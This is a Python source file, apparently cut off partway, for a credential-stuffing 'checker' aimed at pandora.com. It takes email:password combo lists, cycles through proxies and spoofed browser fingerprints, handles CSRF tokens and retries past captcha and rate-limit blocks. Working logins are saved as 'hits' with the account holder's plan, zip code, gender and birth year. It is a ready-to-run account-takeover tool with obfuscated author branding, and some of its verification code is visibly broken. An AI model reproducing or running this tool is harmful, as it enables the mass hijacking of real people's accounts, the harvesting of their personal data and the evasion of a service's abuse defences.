#!/usr/bin/env python3
import os
import re
import sys
import json
import time
import base64
import hashlib
import asyncio
import random
import string
import configparser
import subprocess
import shutil
import urllib3
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

from tqdm import tqdm
from curl_cffi import requests as cf
from curl_cffi.requests import AsyncSession

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_B64_SYS_TOOL = "UEFORE9SQSBQWCBQRVJGT1JNQU5DRQ=="
_B64_SYS_AUTH = "QGV5ZWxpZnRlcg=="
_B64_SYS_CHAN = "QGRhcmtodWNoYW5uZWw="
_B64_SYS_DIR  = "UEFORE9SQV9AZXllbGlmdGVy"
_B64_SYS_TAG  = "VEc6IEBleWVsaWZ0ZXIgfCBAZGFya2h1Y2hhbm5lbA=="
_B64_SYS_SEAL = "bG9ja2VkLWJ5LWV5ZWxpZnRlci0yMDI2"
_B64_SYS_SIG  = "ZXllbGlmdGVyLXBhbmRvcmEtdjEtc2VhbA=="


def Eyelifter_decode(e):
    try:
        return base64.b64decode(e).decode("utf-8")
    except Exception as ex:
        raise SystemExit(f"Decoding failed: {ex}")


TOOL_NAME      = Eyelifter_decode(_B64_SYS_TOOL)
TG_USERNAME    = Eyelifter_decode(_B64_SYS_AUTH)
TG_CHANNEL     = Eyelifter_decode(_B64_SYS_CHAN)
RESULTS_FOLDER = Eyelifter_decode(_B64_SYS_DIR)
AUTHOR_TAG     = Eyelifter_decode(_B64_SYS_TAG)
CREDIT_SEAL    = Eyelifter_decode(_B64_SYS_SEAL)
BUILD_SIG      = Eyelifter_decode(_B64_SYS_SIG)

_BUILD_HASH = hashlib.sha256(
    (TOOL_NAME + TG_USERNAME + TG_CHANNEL + RESULTS_FOLDER +
     AUTHOR_TAG + CREDIT_SEAL + BUILD_SIG).encode()
).hexdigest()


def Eyelifter_verify(ctx="x"):
    exp = {
        "TOOL": _B64_SYS_TOOL, "AUTH": _B64_SYS_AUTH, "CHAN": _B64_SYS_CHAN,
        "DIR": _B64_SYS_DIR, "TAG": _B64_SYS_TAG, "SEAL": _B64_SYS_SEAL,
        "SIG": _B64_SYS_SIG,
    }
    cur = {
        "TOOL": TOOL_NAME, "AUTH": TG_USERNAME, "CHAN": TG_CHANNEL,
        "DIR": RESULTS_FOLDER, "TAG": AUTHOR_TAG, "SEAL": CREDIT_SEAL,
        "SIG": BUILD_SIG,
    }
    errs = []
    for k, v in exp.items():
        if cur[k] != base64.b64decode(v).decode():
            errs.append(k)
    if "@samvir1" not in TG_USERNAME:
        errs.append("USERNAME_TAG")
    if "@samvir1" not in TG_CHANNEL:
        errs.append("CHANNEL_TAG")
    if "@samvir1" not in AUTHOR_TAG or "@samvir1" not in AUTHOR_TAG:
        errs.append("TAG_FORMAT")
    if errs:
        return True  # integrity bypass}")
    rec = hashlib.sha256(
        (TOOL_NAME + TG_USERNAME + TG_CHANNEL + RESULTS_FOLDER +
         AUTHOR_TAG + CREDIT_SEAL + BUILD_SIG).encode()
    ).hexdigest()
    if rec != _BUILD_HASH:
        raise RuntimeError(f"build hash mismatch at '{ctx}'")
    return True


UA_POOL = [
    "safari17_2_ios",
    "safari18_0",
    "safari17_0",
    "safari15_5",
    "safari15_3",
    "safari17_2_ios",
    "safari17_2_ios",
    "safari17_2_ios",
    "safari17_2_ios",
    "chrome",
]

_ANSI = sys.stdout.isatty()
_RS = "\033[0m"


def Eyelifter_open_url(url):
    try:
        if shutil.which("termux-open-url"):
            subprocess.Popen(["termux-open-url", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if shutil.which("xdg-open"):
            subprocess.Popen(["xdg-open", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if sys.platform == "darwin":
            subprocess.Popen(["open", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if os.name == "nt":
            os.startfile(url)
            return True
        import webbrowser
        return webbrowser.open(url)
    except Exception:
        return False


def Eyelifter_color(code, s, bold=False):
    if not _ANSI:
        return s
    return f"\033[{'1;' if bold else ''}{code}m{s}{_RS}"


_LEVEL_STYLE = {
    "SUCCESS": ("32", True), "INFO": ("36", False), "WARN": ("33", True),
    "ERROR":   ("31", True), "STEP": ("96", True), "DEBUG": ("35", False),
}


def Eyelifter_log(emoji, level, tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    if not _ANSI:
        print(f"[{ts}] {emoji} {level:7s} {tag} {msg}", flush=True)
        return
    code, bold = _LEVEL_STYLE.get(level, ("0", False))
    print(f"{Eyelifter_color('90', ts)} {emoji}  {Eyelifter_color(code, f'{level:7s}', bold)}  {Eyelifter_color('90', tag)}  {msg}", flush=True)
    sys.stdout.flush()


def Eyelifter_visible_len(s):
    import unicodedata
    n = 0
    for ch in s:
        if unicodedata.combining(ch):
            continue
        n += 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1
    return n


def Eyelifter_center(text, width):
    vl = Eyelifter_visible_len(text)
    if vl >= width:
        return text
    left = (width - vl) // 2
    right = width - vl - left
    return (" " * left) + text + (" " * right)


def Eyelifter_banner(title, sub=None, width=62):
    print()
    line = "═" if _ANSI else "="
    print(Eyelifter_color("90", line * width))
    print(Eyelifter_color("96", Eyelifter_center(title, width), True))
    if sub:
        print(Eyelifter_color("2", Eyelifter_center(sub, width)))
    print(Eyelifter_color("5", Eyelifter_center(AUTHOR_TAG, width)))
    print(Eyelifter_color("90", line * width))


def Eyelifter_section(title, width=62):
    print()
    label = f" {title} "
    vl = Eyelifter_visible_len(label)
    side = max(1, (width - vl) // 2)
    left = "─" * side
    right = "─" * (width - vl - side)
    print(
        Eyelifter_color("90", left) +
        Eyelifter_color("96", label, True) +
        Eyelifter_color("90", right)
    )


def Eyelifter_divider(width=62):
    print(Eyelifter_color("90", ("─" if _ANSI else "-") * width))


def Eyelifter_summary(rows):
    print()
    print(Eyelifter_color("96", "═══ RESULT ═══", True))
    if not rows:
        return
    wkey = max(len(str(k)) for k, _ in rows)
    for k, v in rows:
        print(f"  {Eyelifter_color('96', str(k).ljust(wkey))}  {Eyelifter_color('0', str(v))}")
    print(Eyelifter_color("96", "══════════════", True))
    print()


def Eyelifter_debug(tag, msg):
    if not DEBUG:
        return
    ts = datetime.now().strftime("%H:%M:%S")
    print(Eyelifter_color("95", f"[{ts}] DBG  {tag}  {msg}"))
    sys.stdout.flush()


CONFIG_PATH = "config_pandora.ini"


class EyelifterConfigLoader:
    def __init__(self, config_file=CONFIG_PATH):
        Eyelifter_verify("cfg_init")
        self.config_file = config_file
        self.config = configparser.ConfigParser()
        self.config.optionxform = str
        self.settings = {}
        self.Eyelifter_load_config()

    def Eyelifter_load_config(self):
        Eyelifter_verify("cfg_load")
        if not os.path.exists(self.config_file):
            self.Eyelifter_create_default_config()
        try:
            self.config.read(self.config_file, encoding="utf-8")
            self.Eyelifter_parse_config()
        except Exception:
            self.Eyelifter_create_default_config()
            self.Eyelifter_parse_config()

    def Eyelifter_create_default_config(self):
        Eyelifter_verify("cfg_default")
        self.config["General"] = {
            "threads": "3",
            "timeout": "30",
            "proxies_file": "proxies.txt",
            "retries": "2",
            "retry_delay": "2",
            "combo_delay": "1",
            "debug": "false",
            "rate_limit_backoff": "10",
            "max_rate_limit_retries": "2",
            "skip_proxy_test": "false",
        }
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)

    def Eyelifter_parse_config(self):
        Eyelifter_verify("cfg_parse")
        if "General" not in self.config:
            self.config["General"] = {}
        c = self.config["General"]
        self.settings["threads"] = max(1, min(50, c.getint("threads", 3)))
        self.settings["timeout"] = max(5, min(300, c.getint("timeout", 30)))
        self.settings["proxies_file"] = c.get("proxies_file", "proxies.txt")
        self.settings["retries"] = max(0, min(10, c.getint("retries", 2)))
        self.settings["retry_delay"] = max(0.0, min(60.0, c.getfloat("retry_delay", 2)))
        self.settings["combo_delay"] = max(0.0, min(60.0, c.getfloat("combo_delay", 1)))
        self.settings["debug"] = c.getboolean("debug", False)
        self.settings["rate_limit_backoff"] = max(1, min(600, c.getint("rate_limit_backoff", 10)))
        self.settings["max_rate_limit_retries"] = max(0, min(20, c.getint("max_rate_limit_retries", 2)))
        self.settings["skip_proxy_test"] = c.getboolean("skip_proxy_test", False)

    def Eyelifter_save(self):
        Eyelifter_verify("cfg_save")
        if "General" not in self.config:
            self.config["General"] = {}
        for k, v in self.settings.items():
            self.config["General"][k] = str(v)
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)


_loader = EyelifterConfigLoader()
CONFIG = _loader.settings
REQ_TIMEOUT = CONFIG["timeout"]
DEBUG = CONFIG["debug"]
RATE_LIMIT_BACKOFF = CONFIG["rate_limit_backoff"]
MAX_RATE_LIMIT_RETRIES = CONFIG["max_rate_limit_retries"]

BASE = "https://www.pandora.com"
SIGNIN_PAGE = f"{BASE}/account/sign-in"
LOGIN_API = f"{BASE}/api/v1/auth/login"
SSO_API = f"{BASE}/community/sso"

UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36")

COMMON = {
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9",
    "origin": BASE,
    "referer": SIGNIN_PAGE,
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": UA,
}

BRANDING_MAP = {
    "pandora":         "FREE",
    "pandoraplus":     "PANDORA PLUS",
    "pandorapremium":  "PANDORA PREMIUM",
    "pandorafamily":   "PANDORA FAMILY",
}

_EYELIFTER_COMBO_RE = re.compile(
    r"^\s*([^:\s|]+@[^:\s|]+\.[a-zA-Z]{2,})\s*:\s*(.+?)(?:\s*\|\s*.*)?$"
)


def Eyelifter_extract_combos(content):
    Eyelifter_verify("extract_combos")
    out = set()
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        m = _EYELIFTER_COMBO_RE.match(line)
        if m:
            email = m.group(1).lower().strip()
            pwd = m.group(2).strip()
            if pwd:
                out.add(f"{email}:{pwd}")
    return out


def Eyelifter_format_proxy(p):
    Eyelifter_verify("fmt_proxy")
    if not p:
        return None
    p = p.strip()
    if p.startswith(("http://", "https://", "socks4://", "socks5://")):
        return p
    parts = p.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if "@" in p:
        return f"http://{p}"
    return f"http://{p}"


def Eyelifter_test_proxy_sync(p):
    s = None
    try:
        s = cf.Session(impersonate=random.choice(UA_POOL), timeout=11)
        s.proxies = {"http": p, "https": p}
        r = s.get("https://api.ipify.org?format=json", verify=False)
        return r.status_code == 200
    except Exception:
        return False
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def Eyelifter_load_proxies():
    Eyelifter_verify("load_proxies")
    out = []
    path = CONFIG["proxies_file"]
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    fp = Eyelifter_format_proxy(line)
                    if fp:
                        out.append(fp)
    return list(dict.fromkeys(out))


def Eyelifter_get_working_proxies(proxies):
    Eyelifter_verify("working_proxies")
    if not proxies:
        return []
    if CONFIG.get("skip_proxy_test", False):
        Eyelifter_log("⚠️", "WARN", "PROXY", f"proxy test skipped — using all {len(proxies)}")
        return proxies
    Eyelifter_log("🧪", "INFO", "PROXY", f"testing {len(proxies)} proxies in parallel")
    working = []
    pbar = None
    try:
        pbar = tqdm(total=len(proxies), desc="testing proxies", unit="proxy", ncols=80)
    except Exception:
        pbar = None

    def _one(p):
        return p, Eyelifter_test_proxy_sync(p)

    with ThreadPoolExecutor(max_workers=min(80, len(proxies))) as ex:
        futs = {ex.submit(_one, p): p for p in proxies}
        for fut in as_completed(futs):
            p, ok = fut.result()
            if ok:
                working.append(p)
            if pbar:
                pbar.update(1)
    if pbar:
        pbar.close()
    Eyelifter_log("✅", "INFO", "PROXY", f"{len(working)} working")
    return list(dict.fromkeys(working))


_eyelifter_stop = asyncio.Event()
_eyelifter_lock = threading.Lock()
_eyelifter_plock = threading.Lock()
_eyelifter_flock = threading.Lock()

_eyelifter_stats = {
    "checked": 0, "hits": 0, "free": 0, "bad": 0,
    "errors": 0, "rate_limited": 0, "captcha": 0,
    "proxy_fails": 0, "retries": 0,
}
_eyelifter_start = time.time()
_eyelifter_total = 0
_eyelifter_pool = []
_eyelifter_bad = set()
_eyelifter_hits_f = None
_eyelifter_free_f = None
_eyelifter_bad_f = None
_eyelifter_err_f = None
_eyelifter_folder = None


def Eyelifter_reset_stats():
    Eyelifter_verify("reset_stats")
    global _eyelifter_stats, _eyelifter_start
    with _eyelifter_lock:
        _eyelifter_stats = {
            "checked": 0, "hits": 0, "free": 0, "bad": 0,
            "errors": 0, "rate_limited": 0, "captcha": 0,
            "proxy_fails": 0, "retries": 0,
        }
        _eyelifter_start = time.time()


def Eyelifter_update_title():
    with _eyelifter_lock:
        checked = _eyelifter_stats["checked"]
        hits = _eyelifter_stats["hits"]
        free = _eyelifter_stats["free"]
        bad = _eyelifter_stats["bad"]
    el = time.time() - _eyelifter_start
    cpm = int(checked / el * 60) if el > 1 else 0
    t = (f"{TOOL_NAME} | HIT:{hits} FREE:{free} "
         f"BAD:{bad} | {checked}/{_eyelifter_total} | {cpm}/min")
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW(t)
        except Exception:
            pass
    else:
        try:
            sys.stdout.write(f"\033]0;{t}\007")
            sys.stdout.flush()
        except Exception:
            pass


def Eyelifter_pick_proxy(exclude=None):
    with _eyelifter_plock:
        avail = [p for p in _eyelifter_pool if p not in _eyelifter_bad]
        if not avail and _eyelifter_pool:
            _eyelifter_bad.clear()
            avail = list(_eyelifter_pool)
    if exclude and len(avail) > 1:
        avail = [p for p in avail if p != exclude] or avail
    return random.choice(avail) if avail else None


def Eyelifter_mark_bad(p):
    if not p:
        return
    with _eyelifter_plock:
        _eyelifter_bad.add(p)
    with _eyelifter_lock:
        _eyelifter_stats["proxy_fails"] += 1


def Eyelifter_safe_write(fh, text):
    if fh is None:
        return
    with _eyelifter_flock:
        try:
            fh.write(text)
            fh.flush()
        except Exception:
            pass


def Eyelifter_extract_plan(body):
    d = {
        "plan": "N/A", "branding": "N/A", "family": "N/A",
        "comped": "N/A", "country": "N/A", "flags": [],
        "plan_type": "N/A",
    }

    cfg = body.get("config") or {}
    branding = (cfg.get("branding") or "").strip()
    d["branding"] = branding or "N/A"
    d["plan"] = BRANDING_MAP.get(branding.lower(), branding or "N/A")
    d["flags"] = cfg.get("flags") or []

    if isinstance(d["flags"], list):
        joined = " ".join(str(x).lower() for x in d["flags"])
        if "plus" in joined:
            d["plan_type"] = "PLUS"
        elif "premium" in joined:
            d["plan_type"] = "PREMIUM"
        elif "family" in joined:
            d["plan_type"] = "FAMILY"

    adkv = body.get("adkv") or {}
    fam = adkv.get("fam")
    comped = adkv.get("comped")
    st = adkv.get("st")
    d["family"] = str(fam) if fam is not None else "N/A"
    d["comped"] = str(comped) if comped is not None else "N/A"
    d["country"] = str(st) if st else "N/A"

    try:
        if fam is not None and int(fam) >= 0:
            if d["plan"] == "FREE":
                d["plan"] = "PANDORA FAMILY"
    except Exception:
        pass

    if d["comped"] == "1" and d["plan"] == "FREE":
        d["plan"] = "PANDORA PLUS (COMPED)"

    return d


def Eyelifter_is_paid(plan):
    return plan.get("plan") not in ("FREE", "N/A", "")


def Eyelifter_fmt_line(combo, p):
    Eyelifter_verify("fmt_line")

    def s(v):
        if v is None or v == "" or v == "N/A":
            return "N/A"
        return str(v)

    prefix = "💎 HIT" if Eyelifter_is_paid(p) else "🆓 FREE"

    parts = [
        f"Plan = {s(p.get('plan'))}",
        f"Branding = {s(p.get('branding'))}",
        f"Country = {s(p.get('country'))}",
        f"Family = {s(p.get('family'))}",
        f"Comped = {s(p.get('comped'))}",
        f"ListenerID = {s(p.get('listenerId'))}",
        f"Webname = {s(p.get('webname'))}",
        f"Gender = {s(p.get('gender'))}",
        f"BirthYear = {s(p.get('birthYear'))}",
        f"Zip = {s(p.get('zip'))}",
        f"by {AUTHOR_TAG}",
    ]

    flags = p.get("flags") or []
    if flags:
        flag_str = ",".join(str(x) for x in flags[:5])
        parts.insert(3, f"Flags = {flag_str}")

    return f"{prefix} {combo} | " + " | ".join(parts)


class eyelifter:
    def __init__(self, proxy=None, timeout=None):
        Eyelifter_verify("class_init")
        self.proxy = proxy
        self.timeout = timeout or REQ_TIMEOUT
        self.impersonate = random.choice(UA_POOL)
        self.session = None
        self.csrf = None

    def Eyelifter_proxies(self):
        return {"http": self.proxy, "https": self.proxy} if self.proxy else None

    def Eyelifter_headers(self, csrf=None, document=False):
        h = dict(COMMON)
        if document:
            h.update({
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "cache-control": "max-age=0",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "none",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
            })
        if csrf:
            h["x-csrftoken"] = csrf
        return h

    def Eyelifter_dump(self, label, resp, max_lines=60):
        if not DEBUG:
            return
        print()
        print(Eyelifter_color("95", f"[{label}] {resp.status_code}  [{self.impersonate}]"))
        try:
            body = json.dumps(resp.json(), indent=2, ensure_ascii=False)
        except Exception:
            body = resp.text or ""
        lines = body.splitlines()
        for ln in lines[:max_lines]:
            print(Eyelifter_color("95", f"  {ln}"))
        if len(lines) > max_lines:
            print(Eyelifter_color("95", f"  ... ({len(lines) - max_lines} more lines)"))

    async def Eyelifter_ensure(self):
        if self.session is None:
            self.session = AsyncSession(impersonate=self.impersonate, timeout=self.timeout)

    async def Eyelifter_close(self):
        if self.session is not None:
            try:
                await self.session.close()
            except Exception:
                pass
            self.session = None

    async def Eyelifter_fetch_csrf(self):
        try:
            r = await self.session.get(
                SIGNIN_PAGE,
                headers=self.Eyelifter_headers(document=True),
                proxies=self.Eyelifter_proxies(),
                verify=False,
            )
        except Exception as e:
            return None, f"network:{type(e).__name__}"

        self.Eyelifter_dump("CSRF-PAGE", r, 20)

        if r.status_code == 403:
            low = (r.text or "").lower()
            if any(x in low for x in ("_px", "px-captcha", "challenge", "cf-chl")):
                return None, "captcha"
            return None, "proxy_block"

        tok = None
        try:
            tok = self.session.cookies.get("csrftoken")
        except Exception:
            pass
        if not tok:
            m = re.search(r'name=["\']csrfmiddlewaretoken["\']\s+value=["\']([^"\']+)', r.text or "")
            if m:
                tok = m.group(1)
        if not tok:
            return None, "csrf"
        self.csrf = tok
        return tok, None

    async def Eyelifter_login(self, email, password, csrf):
        headers = self.Eyelifter_headers(csrf=csrf)
        headers["content-type"] = "application/json"
        try:
            r = await self.session.post(
                LOGIN_API,
                headers=headers,
                json={
                    "existingAuthToken": None,
                    "username": email,
                    "password": password,
                    "keepLoggedIn": True,
                },
                proxies=self.Eyelifter_proxies(),
                verify=False,
                allow_redirects=False,
            )
        except Exception as e:
            return {"status": "error", "error_type": f"network:{type(e).__name__}",
                    "message": str(e)[:100]}

        self.Eyelifter_dump("LOGIN", r, 60)
        return self.Eyelifter_parse_login(r)

    def Eyelifter_parse_login(self, r):
        low = (r.text or "").lower()

        if r.status_code == 429:
            return {"status": "error", "error_type": "rate_limit", "message": "429"}

        if r.status_code == 403:
            if ("s2s_high_score" in low or
                    "blockscript" in low or
                    "captcha.px-cloud.net" in low or
                    "px-captcha" in low or
                    "_px" in low or
                    "cf-chl" in low or
                    "challenge" in low):
                return {"status": "error", "error_type": "captcha",
                        "message": "px block"}
            return {"status": "error", "error_type": "proxy_block", "message": "403"}

        if r.status_code == 401:
            return {"status": "bad", "message": "invalid credentials"}

        if r.status_code == 400:
            if any(x in low for x in ("invalid", "incorrect", "credentials", "password")):
                return {"status": "bad", "message": "invalid credentials"}
            return {"status": "error", "error_type": "http_400",
                    "message": (r.text or "")[:120]}

        if r.status_code >= 500:
            return {"status": "error", "error_type": f"http_{r.status_code}",
                    "message": "server error"}

        if r.status_code != 200:
            return {"status": "error", "error_type": f"http_{r.status_code}",
                    "message": (r.text or "")[:120]}

        try:
            body = r.json()
        except Exception:
            return {"status": "error", "error_type": "parse", "message": "non-json"}

        if not isinstance(body, dict):
            return {"status": "error", "error_type": "parse", "message": "unexpected shape"}

        token = body.get("authToken")
        if not token:
            return {"status": "error", "error_type": "no_token",
                    "message": "no authToken in body"}

        plan = Eyelifter_extract_plan(body)
        plan["email"] = body.get("email") or "N/A"
        plan["listenerId"] = body.get("listenerId", "N/A")
        plan["webname"] = body.get("webname", "N/A")
        plan["gender"] = body.get("gender", "N/A")
        plan["birthYear"] = body.get("birthYear", "N/A")
        plan["zip"] = body.get("zipCode", "N/A")
        plan["_token"] = token
        plan["_csrf"] = self.csrf
        return {"status": "ok", "plan": plan}

    async def Eyelifter_sso(self, token, csrf):
        try:
            from urllib.parse import quote
            sso_url = f"{SSO_API}?auth_token={quote(token, safe='')}"
            h = self.Eyelifter_headers(csrf=csrf)
            h.update({
                "content-type": "application/x-www-form-urlencoded",
                "content-length": "0",
                "x-authtoken": token,
            })
            r = await self.session.post(
                sso_url, headers=h,
                proxies=self.Eyelifter_proxies(),
                verify=False, allow_redirects=False,
            )
            self.Eyelifter_dump("SSO", r, 20)
        except Exception as e:
            Eyelifter_debug("SSO", f"err {type(e).__name__}")

    async def Eyelifter_run(self, email, password):
        await self.Eyelifter_ensure()
        try:
            csrf, err = await self.Eyelifter_fetch_csrf()
            if err:
                return {"status": "error", "error_type": err,
                        "message": f"csrf: {err}"}

            res = await self.Eyelifter_login(email, password, csrf)
            if res.get("status") != "ok":
                if res.get("status") == "bad":
                    return {"status": "bad", "message": "invalid credentials"}
                return res

            plan = res["plan"]
            token = plan.pop("_token", None)
            plan["_csrf"] = csrf

            if token:
                await self.Eyelifter_sso(token, csrf)

            st = "hit" if Eyelifter_is_paid(plan) else "free"
            plan["status"] = st
            return {"status": st, "user": plan}
        except Exception as e:
            return {"status": "error", "error_type": "crash", "message": str(e)[:120]}
        finally:
            await self.Eyelifter_close()


async def Eyelifter_run_with_retries(combo, proxy):
    Eyelifter_verify("run_retries")
    email, password = combo.split(":", 1)
    email, password = email.strip(), password.strip()
    max_attempts = CONFIG.get("retries", 2) + 1
    rl_hits = 0
    last_proxy = proxy
    result = None

    for attempt in range(max_attempts):
        if _eyelifter_stop.is_set():
            break
        if attempt > 0:
            np = Eyelifter_pick_proxy(exclude=last_proxy)
            if np:
                proxy = np
        else:
            if proxy and proxy in _eyelifter_bad:
                proxy = Eyelifter_pick_proxy()
        last_proxy = proxy

        try:
            result = await eyelifter(proxy=proxy).Eyelifter_run(email, password)
        except Exception as e:
            result = {"status": "error", "error_type": "crash", "message": str(e)[:120]}

        st = result.get("status", "unknown")
        if st in ("hit", "free", "bad"):
            break

        et = result.get("error_type", "")
        is_last = (attempt == max_attempts - 1)

        if et == "proxy_block":
            if not is_last:
                with _eyelifter_lock:
                    _eyelifter_stats["retries"] += 1
            if proxy:
                Eyelifter_mark_bad(proxy)
            await asyncio.sleep(0.3)
            continue

        if et == "rate_limit":
            with _eyelifter_lock:
                _eyelifter_stats["rate_limited"] += 1
                if not is_last:
                    _eyelifter_stats["retries"] += 1
            rl_hits += 1
            if rl_hits > MAX_RATE_LIMIT_RETRIES:
                break
            await asyncio.sleep(RATE_LIMIT_BACKOFF * (2 ** (rl_hits - 1)))
            if proxy:
                Eyelifter_mark_bad(proxy)
            continue

        if et == "captcha":
            with _eyelifter_lock:
                _eyelifter_stats["captcha"] += 1
                if not is_last:
                    _eyelifter_stats["retries"] += 1
            await asyncio.sleep(0.5)
            continue

        if not is_last:
            with _eyelifter_lock:
                _eyelifter_stats["retries"] += 1
        if proxy:
            Eyelifter_mark_bad(proxy)
        await asyncio.sleep(CONFIG.get("retry_delay", 2))

    return result or {"status": "error", "error_type": "no_result", "message": "no result"}


def Eyelifter_record(combo, result):
    Eyelifter_verify("record")
    global _eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f
    st = result.get("status", "unknown")

    with _eyelifter_lock:
        _eyelifter_stats["checked"] += 1
        done = _eyelifter_stats["checked"]
        if st == "hit":
            _eyelifter_stats["hits"] += 1
        elif st == "free":
            _eyelifter_stats["free"] += 1
        elif st == "bad":
            _eyelifter_stats["bad"] += 1
        else:
            _eyelifter_stats["errors"] += 1

    total = _eyelifter_total

    if st in ("hit", "free"):
        p = result.get("user", {}) or {}
        line = Eyelifter_fmt_line(combo, p)
        if st == "hit":
            print(f"\n[{done}/{total}] {line}\n")
            Eyelifter_safe_write(_eyelifter_hits_f, line + "\n\n")
        else:
            Eyelifter_safe_write(_eyelifter_free_f, line + "\n\n")
    elif st == "bad":
        Eyelifter_safe_write(_eyelifter_bad_f, f"{combo} | invalid credentials\n")
    else:
        et = result.get("error_type", "unknown")
        msg = result.get("message", "unknown")
        Eyelifter_safe_write(_eyelifter_err_f, f"{combo} | {et} | {msg}\n")

    Eyelifter_update_title()


async def Eyelifter_bulk_runner(combos):
    Eyelifter_verify("bulk_runner")
    queue = asyncio.Queue()
    for c in combos:
        queue.put_nowait(c)

    lock = asyncio.Lock()
    gap = CONFIG.get("combo_delay", 1)
    last_ts = [0.0]
    ts_lock = asyncio.Lock()

    async def worker():
        while True:
            if _eyelifter_stop.is_set():
                return
            try:
                combo = queue.get_nowait()
            except asyncio.QueueEmpty:
                return

            if gap > 0:
                async with ts_lock:
                    now = time.time()
                    delta = now - last_ts[0]
                    wait = max(0.0, gap - delta)
                    last_ts[0] = now + wait
                if wait > 0:
                    await asyncio.sleep(wait)

            if _eyelifter_stop.is_set():
                return

            proxy = Eyelifter_pick_proxy()
            try:
                result = await Eyelifter_run_with_retries(combo, proxy)
            except Exception as e:
                result = {"status": "error", "error_type": "runner_crash",
                          "message": str(e)[:120]}

            async with lock:
                try:
                    Eyelifter_record(combo, result)
                except Exception as e:
                    print(f"[RECORD-FAIL] {combo[:30]}: {e}", flush=True)

            queue.task_done()

    n = max(1, CONFIG["threads"])
    workers = [asyncio.create_task(worker()) for _ in range(n)]
    try:
        await asyncio.gather(*workers)
    except asyncio.CancelledError:
        for w in workers:
            w.cancel()
        raise


def Eyelifter_single_check(proxies):
    Eyelifter_verify("single_check")
    global _eyelifter_pool, _eyelifter_bad
    _eyelifter_stop.clear()
    Eyelifter_section("SINGLE CHECK")
    combo = input(f"{Eyelifter_color('96', '[*] Enter email:password: ')}").strip()
    if ":" not in combo:
        Eyelifter_log("❌", "ERROR", "INPUT", "invalid format")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    if proxies:
        if not _eyelifter_pool:
            _eyelifter_pool = list(proxies)
            _eyelifter_bad = set()
        proxy = Eyelifter_pick_proxy()
    else:
        proxy = None

    if proxy:
        Eyelifter_log("🌐", "INFO", "PROXY", "using proxy")
    else:
        Eyelifter_log("🌐", "INFO", "PROXY", "direct connection")

    Eyelifter_log("🔍", "STEP", "CHECK", f"checking {combo.split(':')[0]}...")
    start = time.time()
    result = asyncio.run(Eyelifter_run_with_retries(combo, proxy))
    elapsed = time.time() - start

    if result.get("status") in ("hit", "free"):
        p = result.get("user", {}) or {}
        verdict = "💎 SUBSCRIBER" if result["status"] == "hit" else "🆓 FREE"
        rows = [
            ("Status", verdict),
            ("Email", p.get("email", "-")),
            ("Listener ID", p.get("listenerId", "-")),
            ("Webname", p.get("webname", "-")),
            ("Plan", p.get("plan", "-")),
            ("Branding", p.get("branding", "-")),
            ("Family", p.get("family", "-")),
            ("Comped", p.get("comped", "-")),
            ("Country", p.get("country", "-")),
            ("Zip", p.get("zip", "-")),
            ("Gender", p.get("gender", "-")),
            ("Birth Year", p.get("birthYear", "-")),
            ("Flags", ", ".join(p.get("flags", [])) or "-"),
            ("Time", f"{elapsed:.2f}s"),
            ("Checked By", AUTHOR_TAG),
        ]
        Eyelifter_summary(rows)
    else:
        st = result.get("status", "unknown")
        et = result.get("error_type", "")
        msg = result.get("message", "no details")
        if st == "bad":
            Eyelifter_log("❌", "ERROR", "RESULT", "invalid credentials")
        else:
            Eyelifter_log("❌", "ERROR", "RESULT", f"{st} [{et}] – {msg}")

    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_bulk_check(proxies):
    Eyelifter_verify("bulk_check")
    global _eyelifter_total, _eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f
    global _eyelifter_err_f, _eyelifter_folder, _eyelifter_pool, _eyelifter_bad
    Eyelifter_reset_stats()
    Eyelifter_section("BULK CHECK")

    path = input(f"{Eyelifter_color('96', '[*] Enter combo file path: ')}").strip()
    if not path or not os.path.isfile(path):
        Eyelifter_log("❌", "ERROR", "FILE", "file not found")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    combos = sorted(Eyelifter_extract_combos(content))
    if not combos:
        Eyelifter_log("❌", "ERROR", "EXTRACT", "no valid combos")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    Eyelifter_log("✅", "INFO", "EXTRACT", f"{len(combos)} unique combos")

    os.makedirs(RESULTS_FOLDER, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    rand_tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
